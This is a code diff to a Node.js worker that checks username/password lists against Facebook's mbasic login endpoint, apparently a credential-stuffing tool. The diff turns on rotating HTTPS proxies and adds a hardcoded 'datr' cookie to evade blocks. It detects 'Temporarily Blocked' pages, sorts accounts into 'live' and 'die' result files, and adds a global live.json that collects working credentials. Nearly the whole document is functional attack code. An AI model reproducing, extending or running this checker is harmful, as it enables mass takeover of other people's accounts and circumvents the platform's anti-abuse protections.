@@ -23,12 +23,22 @@ const API_POST_URL = "https://mbasic.facebook.com/login/device-based/regular/log
 
 
 const getHtmlMBasic = async (url,err,instance,callback) =>{
+ 
+  // instance.interceptors.request.use(config => {
+  //   console.log('Request:', config);
+  //   return config;
+  // });
+
     const option = {
       headers: {
         // 'Access-Control-Allow-Origin': 'https://mbasic.facebook.com/login/',
         // 'Access-Control-Allow-Credentials': 'true',
-        // 'cookie': 'datr=B0FBZCm-6ltlefAz8fycrMG0'
-        "accept-language": "en-US,en;q=0.9"
+        "accept-language": "en-US,en;q=0.9",
+//USE PROXY'S COLDPROXY
+        'cookie': 'datr=f3VDZAMW8wOPiejWVC9ALl31'
+///////////////////////////////////////////////////////
+
+        
       },
     }
     const html = await instance.get(url,option)
@@ -69,34 +79,46 @@ const callApiLogin = async (url,payload,option,instance,callback) =>{
 }
 
 const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
-  // const proxy = await [...proxyList]
-  // if(countProxy  < proxy.length){
-  //   countProxy = countProxy
-  // }else {
-  //   countProxy=0
-  // }
-  // const proxyAgent = new HttpsProxyAgent(`http://${proxy[countProxy].PROXY_HOST}:${proxy[countProxy].PROXY_PORT}`);
-  // console.log(proxy[countProxy].PROXY_HOST + " ", proxy[countProxy].PROXY_PORT)
-  // const proxyAgent = new HttpsProxyAgent(`http://23.134.94.60:6206`);
+  const proxy = await [...proxyList]
+  if(countProxy  < proxy.length){
+    countProxy = countProxy
+  }else {
+    countProxy=0
+  }
+  const proxyAgent = new HttpsProxyAgent(`http://${proxy[countProxy].PROXY_HOST}:${proxy[countProxy].PROXY_PORT}`);
   const instance = axios.create({
-    // httpsAgent: proxyAgent,
-    // timeout: 3000,
-    // withCredentials: true, 
-  });
+    httpsAgent: proxyAgent,
+    timeout: 3000,
+    withCredentials: true, 
+  })
   if(err < 3)
   {
     try {
       const html = await getHtmlMBasic(FB_URL,err,instance,async (err)=>{
         
       })
-      // console.log(html.data)
+      
+      
       const dom = new JSDOM(html.data);
+      const isBlock = await dom.window.document.querySelector('div [title="You’re Temporarily Blocked"]')
+      if(isBlock){
+        console.log('Block getHTML')
+      }
       const payload = await getValue(dom,acc,pass,err)
       let cookie
-      const setCookies = await html.headers['set-cookie'].map(item =>{
-        return item.split(";")[0]
-      })
-      cookie = await setCookies.join(";")
+//USE PROXY'S COLDPROXY
+
+      const cookieSd = html.headers['set-cookie'][0].split(";")[0]
+      cookie = 'datr=f3VDZAMW8wOPiejWVC9ALl31' + ";" + cookieSd
+
+/////////////////////////////////////////////////////////////////
+
+      
+      // const setCookies = await html.headers['set-cookie'].map(item =>{
+      //   return item.split(";")[0]
+      // })
+      // cookie = await setCookies.join(";")
+      
       const option = {
         headers:{
             'cookie': cookie,
@@ -107,9 +129,10 @@ const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
             "accept-language": "en-US,en;q=0.9"
         }
       }
+      
+      
       const handleLogin = await callApiLogin(API_POST_URL,payload,option,instance,async ()=>{
       })
-      // console.log(handleLogin.data)
       const isLogin = await new JSDOM(handleLogin.data);
       const die = await isLogin.window.document.querySelector('#login_error .p') ? await isLogin.window.document.querySelector('#login_error .p').innerHTML :''
       const live = await isLogin.window.document.querySelector('table span.s') ? await isLogin.window.document.querySelector('table span.s').innerHTML :''
@@ -129,6 +152,7 @@ const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
         }else {
           await callback(acc,pass,'die')
           console.log(acc,pass,'erro')
+          console.log(handleLogin.data)
         }
     } catch (error) {
       err++
@@ -140,9 +164,7 @@ const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
       await Start(acc,pass,err,proxyList,countProxy,callback)
     }
   }else {
-    console.log('check proxy:',countProxy)
     countProxy++
-      console.log('check proxy ++ :',countProxy)
      await Start(acc,pass,0,proxyList,countProxy,callback)
     
   }
@@ -189,6 +211,8 @@ const main = async (listAcc,proxyList,count) =>{
 const exportData = async (acc,pas,type,count) =>{
   var dieList = await fs.readFileSync(`./Result/die/die${count}.json`, { encoding: 'utf-8' }) ? await fs.readFileSync(`./Result/die/die${count}.json`, { encoding: 'utf-8' }) : ''
   var liveList = await fs.readFileSync(`./Result/live/live${count}.json`, { encoding: 'utf-8' }) ? await fs.readFileSync(`./Result/live/live${count}.json`, { encoding: 'utf-8' }) : ''
+  var global = await fs.readFileSync(`live.json`, { encoding: 'utf-8' })
+  const globalPar = await JSON.parse(global)
   const die= dieList ? await JSON.parse(dieList) : []
   const live= liveList ? await JSON.parse(liveList) : []
   let node = {
@@ -202,6 +226,18 @@ const exportData = async (acc,pas,type,count) =>{
               return;
             }
           })
+        if(type == 'live')
+        {
+          await globalPar.push({"acc":acc,"pas":pas})
+          await fs.writeFile(`live.json`, JSON.stringify(globalPar), 'utf8', (err) => {
+            if (err) {
+              console.error(err);
+              return;
+            }
+          })
+        }
+          
+          
 }
 
 
@@ -210,8 +246,7 @@ const exportData = async (acc,pas,type,count) =>{
 
 parentPort.on("message",async (data) => {
   const mailList = JSON.parse(data.data)
-  // const proxyList = JSON.parse(data.proxy)
-  const proxyList = []
+  const proxyList = JSON.parse(data.proxy)
   main(mailList,proxyList,data.count)
 });
 
